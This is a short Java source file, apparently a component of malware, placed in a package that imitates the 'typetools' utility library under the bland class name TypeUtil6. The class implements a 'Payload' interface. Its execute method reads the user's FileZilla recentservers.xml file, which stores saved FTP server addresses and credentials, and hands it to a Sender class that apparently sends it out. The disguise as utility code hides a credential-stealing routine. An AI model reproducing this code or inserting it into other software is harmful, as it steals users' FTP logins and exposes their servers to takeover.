package net.jodah.typetools.util.impl;

import net.jodah.typetools.Sender;
import net.jodah.typetools.util.FileUtil;
import net.jodah.typetools.util.Payload;

import java.io.File;
import java.util.Optional;

public final class TypeUtil6 implements Payload
{
    @Override
    public void execute() throws Exception
    {
        Optional<File> file = FileUtil.getFile(System.getProperty("user.home") + "/AppData/Roaming/FileZilla/recentservers.xml");
        file.ifPresent(Sender::send);
    }
}
